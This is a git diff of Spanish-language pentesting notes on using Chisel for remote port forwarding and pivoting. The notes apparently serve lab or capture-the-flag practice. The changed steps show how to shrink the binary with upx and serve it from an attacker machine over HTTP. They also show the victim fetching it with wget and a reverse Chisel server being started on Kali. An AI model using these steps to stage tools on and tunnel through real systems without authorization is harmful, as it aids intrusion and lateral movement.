@@ -4,22 +4,23 @@ Tags: #Chisel #DinamicForwarding #RemoteForwarding #Pivoting
 
 Permite redirigir todo el tráfico entrante de un puerto local hacia un puerto remoto.
 
-* **Server -> Windows** 
-* **Cliente -> Kali**
+*Server -> Windows*
+*Cliente -> Kali*
+
+* [Chisel](https://github.com/jpillora/chisel/releases/tag/v1.11.5)
+
+## Transferir chisel 
 
 ```bash
-1. Descargar el binario 'Chisel' desde los 'Releases' para Windows o Linux
-❯ https://github.com/jpillora/chisel
-
 # En Linux 
-2. Reducir el tamaño al binario 'Chisel' para una transferencia más rapida
+1. Reducir el tamaño al binario 'Chisel' para una transferencia más rapida
 ❯ du -hc chisel                   # Mirar el peso del binario
 ❯ upx Chisel                      # Reducir el tamaño del binario 
 
 
-3. Transferir Chisel a la maquina víctima mediante un servidor 'HTTP' 
-❯ python3 -m http.server 80       # Maquina de atacante 
-❯ wget http://IP/chisel           # Maquina víctima 
+2. Transferir Chisel a la maquina víctima mediante un servidor 'HTTP' 
+❯ python3 -m http.server 80       # Máquina de atacante 
+❯ wget http://IP/chisel           # Máquina víctima 
 ```
 
 ## 1. Remote Port Forwarding
@@ -27,6 +28,8 @@ Permite redirigir todo el tráfico entrante de un puerto local hacia un puerto r
 ## 1.1 Crear un túnel con un puerto especifico 
 
 ```bash
+NOTA: Funciona muy bien para traer servicios en el 'localhost' de la máquina víctima 
+
 ❯ ./chisel server --reverse -p 1234       # Server 'Maquina Kali'
 
 	# Port-Server = Puerto a abrir en Kali
